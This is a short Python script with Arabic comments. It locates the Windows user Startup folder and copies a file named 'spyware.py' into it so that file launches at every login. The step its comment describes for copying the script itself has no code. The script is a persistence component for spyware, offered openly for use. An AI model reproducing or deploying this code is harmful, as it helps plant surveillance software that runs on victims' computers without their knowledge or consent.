import os
import shutil
import sys

def copy_self_to_startup_and_move_file():
    # الحصول على مسار ملف السكريبت الحالي
    current_script = os.path.abspath(__file__)
    script_directory = os.path.dirname(current_script)
    
    # تحديد مسار مجلد بدء التشغيل
    startup_folder = os.path.join(os.path.expanduser("~"), "AppData", "Roaming", "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
    
    # تحديد مسار النسخة في مجلد بدء التشغيل
    new_script_path = os.path.join(startup_folder, os.path.basename(current_script))

    # نسخ السكريبت إلى مجلد بدء التشغيل
  
    
    # تحديد الملف الآخر الذي تريد نقله
    file_to_move = os.path.join('spyware.py')  # استبدل 'اسم_الملف_الذي_تريد_نقله.ext' باسم الملف الفعلي
    new_file_path = os.path.join(startup_folder, os.path.basename(file_to_move))
    
    # نقل الملف إلى مجلد بدء التشغيل
    shutil.copy(file_to_move, new_file_path)
    print(f"تم نقل الملف إلى: {new_file_path}")

if __name__ == "__main__":
    copy_self_to_startup_and_move_file()
